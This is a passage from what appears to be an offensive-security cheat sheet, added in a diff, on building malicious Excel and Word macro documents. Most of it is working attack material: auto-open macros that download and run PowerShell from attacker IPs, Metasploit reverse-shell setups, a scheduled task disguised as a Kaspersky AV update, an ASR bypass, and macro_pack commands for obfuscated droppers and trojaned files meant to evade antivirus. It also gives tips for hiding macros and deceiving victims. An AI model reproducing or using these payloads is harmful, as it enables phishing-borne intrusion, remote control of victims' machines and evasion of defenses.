+</span></span></code></pre></div><h2 id="xlm-excel-40---excelntdonut">
+  XLM Excel 4.0 - EXCELntDonut
+  <a class="anchor" href="#xlm-excel-40---excelntdonut">#</a>
+</h2>
+<ul>
+<li>XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.</li>
+<li>AMSI has no visibility into XLM macros (for now)</li>
+<li>Anti-virus struggles with XLM (for now)</li>
+<li>XLM macros can access the Win32 API (virtualalloc, createthread, &hellip;)</li>
+</ul>
+<ol>
+<li>Open an Excel Workbook.</li>
+<li>Right click on &ldquo;Sheet 1&rdquo; and click &ldquo;Insert&hellip;&rdquo;. Select &ldquo;MS Excel 4.0 Macro&rdquo;.</li>
+<li>Open your EXCELntDonut output file in a text editor and copy everything.</li>
+<li>Paste the EXCELntDonut output text in Column A of your XLM Macro sheet.</li>
+<li>At this point, everything is in column A. To fix that, we&rsquo;ll use the &ldquo;Text-to-Columns&rdquo;/&ldquo;Convert&rdquo; tool under the &ldquo;Data&rdquo; tab.</li>
+<li>Highlight column A and open the &ldquo;Text-to-Columns&rdquo;  tool. Select &ldquo;Delimited&rdquo; and then &ldquo;Semicolon&rdquo; on the next screen. Select &ldquo;Finished&rdquo;.</li>
+<li>Right-click on cell A1* and select &ldquo;Run&rdquo;. This will execute your payload to make sure it works.</li>
+<li>To enable auto-execution, we need to rename cell A1* to &ldquo;Auto_Open&rdquo;. You can do this by clicking into cell A1 and then clicking into the box that says &ldquo;A1&rdquo;* just above Column A. Change the text from &ldquo;A1&rdquo;* to &ldquo;Auto_Open&rdquo;. Save the file and verify that auto-execution works.</li>
+</ol>
+<p>:warning: If you&rsquo;re using the obfuscate flag, after the Text-to-columns operation, your macros won&rsquo;t start in A1. Instead, they&rsquo;ll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let&rsquo;s say that cell is HJ1. If that&rsquo;s the case, then complete steps 6-7 substituting HJ1 for A1</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/FortyNorthSecurity/EXCELntDonut
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-f</span> path to file containing your C<span style="color:#75715e"># source code (exe or dll)</span>
+</span></span><span style="display:flex;"><span>-c ClassName where method that you want to call lives (dll)
+</span></span><span style="display:flex;"><span>-m Method containing your executable payload (dll)
+</span></span><span style="display:flex;"><span>-r References needed to compile your C<span style="color:#75715e"># code (ex: -r &#39;System.Management&#39;)</span>
+</span></span><span style="display:flex;"><span>-o output filename
+</span></span><span style="display:flex;"><span>--sandbox Perform basic sandbox checks. 
+</span></span><span style="display:flex;"><span>--obfuscate Perform basic macro obfuscation. 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Fork</span>
+</span></span><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py
+</span></span><span style="display:flex;"><span>C:\Windows\Microsoft.NET\Framework64\v4.0.<span style="color:#ae81ff">30319</span>\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\Users\User\Desktop\covenSource.cs 
+</span></span><span style="display:flex;"><span>C:\Windows\Microsoft.NET\Framework64\v4.0.<span style="color:#ae81ff">30319</span>\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\Users\User\Desktop\covenSource.cs
+</span></span><span style="display:flex;"><span>donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe
+</span></span><span style="display:flex;"><span>donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe
+</span></span><span style="display:flex;"><span>usage<span style="color:#960050;background-color:#1e0010">:</span> drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]
+</span></span><span style="display:flex;"><span>python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin
+</span></span></code></pre></div><p>XLM: 
+  <a href="https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md">https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md</a></p>
+<h2 id="xlm-excel-40---exec">
+  XLM Excel 4.0 - EXEC
+  <a class="anchor" href="#xlm-excel-40---exec">#</a>
+</h2>
+<ol>
+<li>Right Click to the current sheet</li>
+<li>Insert a <strong>Macro IntL MS Excel 4.0</strong></li>
+<li>Add the <code>EXEC</code> macro
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>=EXEC(<span style="color:#e6db74">&#34;poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg(&#39;http://10.10.10.10:80/update.ps1&#39;)&#34;</span>)
+</span></span><span style="display:flex;"><span>=halt()
+</span></span></code></pre></div></li>
+<li>Rename cell to <strong>Auto_open</strong></li>
+<li>Hide your macro worksheet by a right mouse click on the sheet name <strong>Macro1</strong> and selecting <strong>Hide</strong></li>
+</ol>
+<h2 id="docm---metasploit">
+  DOCM - Metasploit
+  <a class="anchor" href="#docm---metasploit">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>use exploit/multi/fileformat/office_word_macro
+</span></span><span style="display:flex;"><span>set payload windows/meterpreter/reverse_http
+</span></span><span style="display:flex;"><span>set LHOST <span style="color:#ae81ff">10.10</span>.10.10
+</span></span><span style="display:flex;"><span>set LPORT <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>set DisablePayloadHandler True
+</span></span><span style="display:flex;"><span>set PrependMigrate True
+</span></span><span style="display:flex;"><span>set FILENAME Financial2021.docm
+</span></span><span style="display:flex;"><span>exploit -j
+</span></span></code></pre></div><h2 id="docm---download-and-execute">
+  DOCM - Download and Execute
+  <a class="anchor" href="#docm---download-and-execute">#</a>
+</h2>
+<blockquote>
+<p>Detected by Defender (AMSI)</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Sub Execute()
+</span></span><span style="display:flex;"><span>Dim payload
+</span></span><span style="display:flex;"><span>payload = <span style="color:#e6db74">&#34;powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={</span>$true<span style="color:#e6db74">};</span>$v<span style="color:#e6db74">=new-object net.webclient;</span>$v<span style="color:#e6db74">.proxy=[Net.WebRequest]::GetSystemWebProxy();</span>$v<span style="color:#e6db74">.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX </span>$v<span style="color:#e6db74">.downloadstring(&#39;http://10.10.10.10:4242/exploit&#39;);&#34;</span>
+</span></span><span style="display:flex;"><span>Call Shell(payload, vbHide)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span><span style="display:flex;"><span>Sub Document_Open()
+</span></span><span style="display:flex;"><span>Execute
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span></code></pre></div><h2 id="docm---macro-creator">
+  DOCM - Macro Creator
+  <a class="anchor" href="#docm---macro-creator">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator">https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:</span>
+</span></span><span style="display:flex;"><span>C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:</span>
+</span></span><span style="display:flex;"><span>C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:</span>
+</span></span><span style="display:flex;"><span>C:\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url <span style="color:#e6db74">&#39;http://my.server.com/sources.xml&#39;</span> -d biblio -c <span style="color:#e6db74">&#39;regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll&#39;</span> -o -e
+</span></span></code></pre></div><h2 id="docm---c-converted-to-office-vba-macro">
+  DOCM - C# converted to Office VBA macro
+  <a class="anchor" href="#docm---c-converted-to-office-vba-macro">#</a>
+</h2>
+<blockquote>
+<p>A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.</p>
+</blockquote>
+<p>
+  <a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>python unicorn.py payload.cs cs macro
+</span></span></code></pre></div><h2 id="docm---vba-wscript">
+  DOCM - VBA Wscript
+  <a class="anchor" href="#docm---vba-wscript">#</a>
+</h2>
+<blockquote>
+<p>
+  <a href="https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office">https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office</a></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Sub parent_change()
+</span></span><span style="display:flex;"><span>    Dim objOL
+</span></span><span style="display:flex;"><span>    Set objOL = CreateObject(<span style="color:#e6db74">&#34;Outlook.Application&#34;</span>)
+</span></span><span style="display:flex;"><span>    Set shellObj = objOL.CreateObject(<span style="color:#e6db74">&#34;Wscript.Shell&#34;</span>)
+</span></span><span style="display:flex;"><span>    shellObj.Run(<span style="color:#e6db74">&#34;notepad.exe&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span><span style="display:flex;"><span>Sub AutoOpen()
+</span></span><span style="display:flex;"><span>    parent_change
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span><span style="display:flex;"><span>Sub Auto_Open()
+</span></span><span style="display:flex;"><span>    parent_change
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span>CreateObject(<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>).Run <span style="color:#e6db74">&#34;calc.exe&#34;</span>
+</span></span><span style="display:flex;"><span>CreateObject(<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>).Exec <span style="color:#e6db74">&#34;notepad.exe&#34;</span>
+</span></span></code></pre></div><h2 id="docm---vba-shell-execute-comment">
+  DOCM - VBA Shell Execute Comment
+  <a class="anchor" href="#docm---vba-shell-execute-comment">#</a>
+</h2>
+<p>Set your command payload inside the <strong>Comment</strong> metadata of the document.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-vb" data-lang="vb"><span style="display:flex;"><span><span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">beautifulcomment</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Dim</span> p <span style="color:#f92672">As</span> DocumentProperty
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">For</span> <span style="color:#66d9ef">Each</span> p <span style="color:#f92672">In</span> ActiveDocument.BuiltInDocumentProperties
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">If</span> p.Name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Comments&#34;</span> <span style="color:#66d9ef">Then</span>
+</span></span><span style="display:flex;"><span>            Shell (p.Value)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">End</span> <span style="color:#66d9ef">If</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Next</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">AutoExec</span>()
+</span></span><span style="display:flex;"><span>    beautifulcomment
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Sub</span> <span style="color:#a6e22e">AutoOpen</span>()
+</span></span><span style="display:flex;"><span>    beautifulcomment
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> <span style="color:#66d9ef">Sub</span>
+</span></span></code></pre></div><h2 id="docm---vba-spawning-via-svchostexe-using-scheduled-task">
+  DOCM - VBA Spawning via svchost.exe using Scheduled Task
+  <a class="anchor" href="#docm---vba-spawning-via-svchostexe-using-scheduled-task">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Sub AutoOpen()
+</span></span><span style="display:flex;"><span>    Set service = CreateObject(<span style="color:#e6db74">&#34;Schedule.Service&#34;</span>)
+</span></span><span style="display:flex;"><span>    Call service.Connect
+</span></span><span style="display:flex;"><span>    Dim td<span style="color:#960050;background-color:#1e0010">:</span> Set td = service.NewTask(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    td.RegistrationInfo.Author = <span style="color:#e6db74">&#34;Kaspersky Corporation&#34;</span>
+</span></span><span style="display:flex;"><span>    td.settings.StartWhenAvailable = True
+</span></span><span style="display:flex;"><span>    td.settings.Hidden = False
+</span></span><span style="display:flex;"><span>    Dim triggers<span style="color:#960050;background-color:#1e0010">:</span> Set triggers = td.triggers
+</span></span><span style="display:flex;"><span>    Dim trigger<span style="color:#960050;background-color:#1e0010">:</span> Set trigger = triggers.Create(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    Dim startTime<span style="color:#960050;background-color:#1e0010">:</span> ts = DateAdd(<span style="color:#e6db74">&#34;s&#34;</span>, <span style="color:#ae81ff">30</span>, Now)
+</span></span><span style="display:flex;"><span>    startTime = Year(ts) &amp; <span style="color:#e6db74">&#34;-&#34;</span> &amp; Right(Month(ts), <span style="color:#ae81ff">2</span>) &amp; <span style="color:#e6db74">&#34;-&#34;</span> &amp; Right(Day(ts), <span style="color:#ae81ff">2</span>) &amp; <span style="color:#e6db74">&#34;T&#34;</span> &amp; Right(Hour(ts), <span style="color:#ae81ff">2</span>) &amp; <span style="color:#e6db74">&#34;:&#34;</span> &amp; Right(Minute(ts), <span style="color:#ae81ff">2</span>) &amp; <span style="color:#e6db74">&#34;:&#34;</span> &amp; Right(Second(ts), <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    trigger.StartBoundary = startTime
+</span></span><span style="display:flex;"><span>    trigger.ID = <span style="color:#e6db74">&#34;TimeTriggerId&#34;</span>
+</span></span><span style="display:flex;"><span>    Dim Action<span style="color:#960050;background-color:#1e0010">:</span> Set Action = td.Actions.Create(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    Action.Path = <span style="color:#e6db74">&#34;C:\Windows\System32\powershell.exe&#34;</span>
+</span></span><span style="display:flex;"><span>    Action.Arguments = <span style="color:#e6db74">&#34;-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&#34;</span>
+</span></span><span style="display:flex;"><span>    Call service.GetFolder(<span style="color:#e6db74">&#34;\&#34;</span>).RegisterTaskDefinition(<span style="color:#e6db74">&#34;AVUpdateTask&#34;</span>, td, <span style="color:#ae81ff">6</span>, , , <span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span><span style="display:flex;"><span>Rem powershell.exe -nop -w hidden -c <span style="color:#e6db74">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&#34;</span>
+</span></span></code></pre></div><h2 id="docm---wmi-com-functions">
+  DOCM - WMI COM functions
+  <a class="anchor" href="#docm---wmi-com-functions">#</a>
+</h2>
+<p>Basic WMI exec (detected by Defender) : <code>r = GetObject(&quot;winmgmts:\\.\root\cimv2:Win32_Process&quot;).Create(&quot;calc.exe&quot;, null, null, intProcessID)</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Sub wmi_exec()
+</span></span><span style="display:flex;"><span>    strComputer = <span style="color:#e6db74">&#34;.&#34;</span>
+</span></span><span style="display:flex;"><span>    Set objWMIService = GetObject(<span style="color:#e6db74">&#34;winmgmts:\\&#34;</span> &amp; strComputer &amp; <span style="color:#e6db74">&#34;\root\cimv2&#34;</span>)
+</span></span><span style="display:flex;"><span>    Set objStartUp = objWMIService.Get(<span style="color:#e6db74">&#34;Win32_ProcessStartup&#34;</span>)
+</span></span><span style="display:flex;"><span>    Set objProc = objWMIService.Get(<span style="color:#e6db74">&#34;Win32_Process&#34;</span>)
+</span></span><span style="display:flex;"><span>    Set procStartConfig = objStartUp.SpawnInstance_
+</span></span><span style="display:flex;"><span>    procStartConfig.ShowWindow = <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    objProc.Create <span style="color:#e6db74">&#34;powershell.exe&#34;</span>, Null, procStartConfig, intProcessID
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span></code></pre></div><ul>
+<li>
+  <a href="https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3">https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3</a></li>
+<li>
+  <a href="https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2">https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Sub ASR_bypass_create_child_process_rule5()
+</span></span><span style="display:flex;"><span>    Const HIDDEN_WINDOW = <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    strComputer = <span style="color:#e6db74">&#34;.&#34;</span>
+</span></span><span style="display:flex;"><span>    Set objWMIService = GetObject(<span style="color:#e6db74">&#34;win&#34;</span> &amp; <span style="color:#e6db74">&#34;mgmts&#34;</span> &amp; <span style="color:#e6db74">&#34;:\\&#34;</span> &amp; strComputer &amp; <span style="color:#e6db74">&#34;\root&#34;</span> &amp; <span style="color:#e6db74">&#34;\cimv2&#34;</span>)
+</span></span><span style="display:flex;"><span>    Set objStartup = objWMIService.Get(<span style="color:#e6db74">&#34;Win32_&#34;</span> &amp; <span style="color:#e6db74">&#34;Process&#34;</span> &amp; <span style="color:#e6db74">&#34;Startup&#34;</span>)
+</span></span><span style="display:flex;"><span>    Set objConfig = objStartup.SpawnInstance_
+</span></span><span style="display:flex;"><span>    objConfig.ShowWindow = HIDDEN_WINDOW
+</span></span><span style="display:flex;"><span>    Set objProcess = GetObject(<span style="color:#e6db74">&#34;winmgmts:\\&#34;</span> &amp; strComputer &amp; <span style="color:#e6db74">&#34;\root&#34;</span> &amp; <span style="color:#e6db74">&#34;\cimv2&#34;</span> &amp; <span style="color:#e6db74">&#34;:Win32_&#34;</span> &amp; <span style="color:#e6db74">&#34;Process&#34;</span>)
+</span></span><span style="display:flex;"><span>    objProcess.Create <span style="color:#e6db74">&#34;cmd.exe /c powershell.exe IEX ( IWR -uri &#39;http://10.10.10.10/stage.ps1&#39;)&#34;</span>, Null, objConfig, intProcessID
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Sub AutoExec()
+</span></span><span style="display:flex;"><span>    ASR_bypass_create_child_process_rule5
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Sub AutoOpen()
+</span></span><span style="display:flex;"><span>    ASR_bypass_create_child_process_rule5
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">End</span> Sub
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Const ShellWindows = <span style="color:#e6db74">&#34;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&#34;</span>
+</span></span><span style="display:flex;"><span>Set SW = GetObject(<span style="color:#e6db74">&#34;new:&#34;</span> &amp; ShellWindows).Item()
+</span></span><span style="display:flex;"><span>SW.Document.Application.ShellExecute <span style="color:#e6db74">&#34;cmd.exe&#34;</span>, <span style="color:#e6db74">&#34;/c powershell.exe&#34;</span>, <span style="color:#e6db74">&#34;C:\Windows\System32&#34;</span>, Null, <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><h2 id="docmxlm---macro-pack---macro-and-dde">
+  DOCM/XLM - Macro Pack - Macro and DDE
+  <a class="anchor" href="#docmxlm---macro-pack---macro-and-dde">#</a>
+</h2>
+<blockquote>
+<p>Only the community version is available online.</p>
+</blockquote>
+<ul>
+<li>
+  <a href="https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe">https://github.com/sevagas/macro_pack</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Options</span>
+</span></span><span style="display:flex;"><span>-G, --generate=OUTPUT_FILE_PATH. Generates a file. 
+</span></span><span style="display:flex;"><span>-t, --template=TEMPLATE_NAME    Use code template already included <span style="color:#66d9ef">in</span> MacroPack
+</span></span><span style="display:flex;"><span>-o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate <span style="color:#66d9ef">function</span>s and variables name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute a command</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;calc.exe&#34;</span> | macro_pack.exe -t CMD -G cmd.xsl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download and execute a file</span>
+</span></span><span style="display:flex;"><span>echo &lt;file_to_drop_url&gt; <span style="color:#e6db74">&#34;&lt;download_path&gt;&#34;</span> | macro_pack.exe -t DROPPER -o -G dropper.xls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Meterpreter reverse TCP template using MacroMeter by Cn33liz</span>
+</span></span><span style="display:flex;"><span>echo &lt;ip&gt; &lt;port&gt; | macro_pack.exe -t METERPRETER -o -G meter.docm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Drop and execute embedded file</span>
+</span></span><span style="display:flex;"><span>macro_pack.exe -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Obfuscate the vba file generated by msfvenom and put result in a new vba file.</span>
+</span></span><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#ae81ff">192.168</span>.0.5 <span style="color:#f92672">-f</span> vba | macro_pack.exe -o -G meterobf.vba
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Obfuscate Empire stager vba file and generate a MS Word document:</span>
+</span></span><span style="display:flex;"><span>macro_pack.exe <span style="color:#f92672">-f</span> empire.vba -o -G myDoc.docm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;https://myurl.url/payload.exe&#34;</span> <span style="color:#e6db74">&#34;dropped.exe&#34;</span> |  macro_pack.exe -o -t DROPPER -G <span style="color:#e6db74">&#34;drop.xlsm&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute calc.exe via Dynamic Data Exchange (DDE) attack</span>
+</span></span><span style="display:flex;"><span>echo calc.exe | macro_pack.exe --dde -G calc.xslx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Download and execute file via powershell using Dynamic Data Exchange (DDE) attack</span>
+</span></span><span style="display:flex;"><span>macro_pack.exe --dde <span style="color:#f92672">-f</span> ..\resources\community\ps_dl_exec.cmd -G DDE.xsl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV).</span>
+</span></span><span style="display:flex;"><span>msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=<span style="color:#ae81ff">192.168</span>.0.5 <span style="color:#f92672">-f</span> vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses.</span>
+</span></span><span style="display:flex;"><span>msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<span style="color:#ae81ff">192.168</span>.0.5 <span style="color:#f92672">-f</span> vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PRO: Generate an HTA payload able to run a shellcode via Excel injection</span>
+</span></span><span style="display:flex;"><span>echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE  --run-in-excel -o -G samples\nicepic.hta
+</span></span><span style="display:flex;"><span>echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\my_shortcut.lnk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PRO: XLM Injection</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;MPPro&#34;</span> | macro_pack.exe -G _samples\hello.doc -t HELLO --xlm --run-in-excel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PRO: ShellCode Exec - Heap Injection, AlternativeInjection</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;x32calc.bin&#34;</span> | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;x32calc.bin&#34;</span> | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PRO: More shellcodes</span>
+</span></span><span style="display:flex;"><span>echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm <span style="color:#960050;background-color:#1e0010">–</span>keep-alive
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;x86.bin&#34;</span> <span style="color:#e6db74">&#34;x64.bin&#34;</span> | macro_pack.exe -t AUTOSHELLCODE -o <span style="color:#960050;background-color:#1e0010">–</span>autopack -G sc_auto.doc
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;http://192.168.5.10:8080/x32calc.bin&#34;</span> <span style="color:#e6db74">&#34;http://192.168.5.10:8080/x64calc.bin&#34;</span> | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
+</span></span></code></pre></div><h2 id="docm---badassmacros">
+  DOCM - BadAssMacros
+  <a class="anchor" href="#docm---badassmacros">#</a>
+</h2>
+<blockquote>
+<p>C# based automated Malicous Macro Generator.</p>
+</blockquote>
+<ul>
+<li>
